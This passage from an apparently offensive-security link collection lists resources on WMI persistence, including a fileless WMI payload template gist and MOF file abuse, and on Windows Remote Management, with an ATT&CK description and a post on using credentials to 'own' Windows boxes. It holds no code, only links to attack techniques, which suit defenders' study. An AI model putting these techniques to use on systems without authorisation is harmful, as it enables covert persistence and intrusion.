* [Learn About Scripting for Windows Management Instrumentation (WMI) - technet](https://technet.microsoft.com/en-us/scriptcenter/dd742341.aspx)
* [WMI Persistence using wmic.exe - exploit-monday](http://www.exploit-monday.com/2016/08/wmi-persistence-using-wmic.html)
* [WMI_persistence_template.ps1](https://gist.github.com/mattifestation/e55843eef6c263608206)
	* `Fileless WMI persistence payload template (CommandlineEventConsumer, __IntervalTimerInstruction trigger, w/ registry payload storage)`
* [Playing with MOF files on Windows, for fun & profit](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html)
* [Managed Object Format (MOF)](https://msdn.microsoft.com/en-us/library/aa823192(VS.85).aspx)











-------------------------------
## Windows Remote Management
* [Windows Remote Management - ATT&CK](https://attack.mitre.org/wiki/Technique/T1028)
	* Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).Microsoft WinRM It may be called with the winrm command or by any number of programs such as PowerShell.Jacobsen 2014

#### Windows
* [An Introduction to WinRM Basics - technet](https://blogs.technet.microsoft.com/askperf/2010/09/24/an-introduction-to-winrm-basics/)
* [Windows Remote Management - msdn](https://msdn.microsoft.com/en-us/library/aa384426)
* [Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM)](http://hackingandsecurity.blogspot.com/2016/08/using-credentials-to-own-windows-boxes_99.html)







